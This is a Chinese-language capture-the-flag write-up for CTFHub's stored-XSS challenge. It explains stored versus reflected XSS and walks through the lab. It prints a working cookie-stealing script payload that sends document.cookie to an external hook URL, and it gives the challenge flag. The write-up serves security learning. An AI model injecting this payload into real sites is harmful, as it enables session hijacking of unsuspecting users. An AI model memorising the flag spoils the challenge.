---
title: CTFHub-XSS-存储型 Writeup
date: 2026-10-03
category: web
tags: [CTFHub, XSS]
---
## 题目描述

存储型XSS（Persistent XSS），用户提交的输入内容会持久保存到后端数据库。当Bot访问该页面时，服务端从数据库取出内容并直接渲染到HTML页面，触发XSS。
和反射型XSS区别：反射型XSS的Payload放在URL参数里，一次性生效；存储型XSS存入数据库，所有访问该页面的用户都会触发Payload。

## 解题思路

构造可窃取 Cookie 的 JS 恶意代码，提交到页面存入数据库，让机器人访问页面执行代码，通过自己搭建的 Hook 接收 Bot 携带 Cookie 的请求，提取 Flag。

最终Payload
<script>var img=new Image();img.src="https://play.hook0.com/in/c_X1kgO6bQt0igNdGntGhnpUJzdRr/?c="+document.cookie;</script>

## 解题过程
1. 开启 CTFHub 存储型XSS靶场，进入题目环境，页面存在 Change name 输入框和 Bot 发包功能。

2. 首先使用简单弹窗 进行测试，提交后页面成功弹窗，确认题目不过滤 script 标签、不转义特殊字符，存在可用XSS漏洞。

3. 为了测试页面跳转效果，使用 location.href 跳转测试 Payload 提交，验证 JS 可正常执行。

4. 发现跳转 Payload 存入数据库后，每次打开靶场都会自动跳转 Hook 页面，彻底无法操作输入框，靶场卡死无法继续做题。

5. 选择关闭原有靶场环境，重新开启全新靶场，清空数据库残留的恶意代码，恢复页面正常状态。

6. 更换不会跳转页面、静默发包的最终 Payload，清空输入框原有内容，粘贴代码并点击 Submit 提交，将恶意代码存入服务器数据库。

7. 复制当前靶场页面的完整浏览器URL，粘贴到题目下方 Send URL to Bot 输入框，发送给后台机器人访问。

8. 机器人访问页面后自动执行 JS 代码，将自身 Cookie 携带到我的 Hook 链接中。

9. 打开 Hook0 后台查看请求记录，从请求参数中提取 Cookie，成功拿到题目 Flag。

## Flag
ctfhub{c38235e3199bd3b7eb60c44f}

## 踩坑
1. 误用跳转Payload导致靶场锁死
刚开始测试使用 location.href 跳转代码，代码存入数据库后永久生效，每次进入靶场都会强制跳转 Hook 页面，没有输入框、无法修改内容，完全无法继续操作。最后只能重启靶场解决，后续全部使用静默发包Payload。

2. 误以为自己刷新页面能拿到Flag
前期反复刷新自己的浏览器，Hook一直为空、没有有效数据。后面明白：自己浏览器执行代码只能拿到自己的Cookie，没有Flag；只有Bot的Cookie才存有Flag，必须发送URL给机器人。
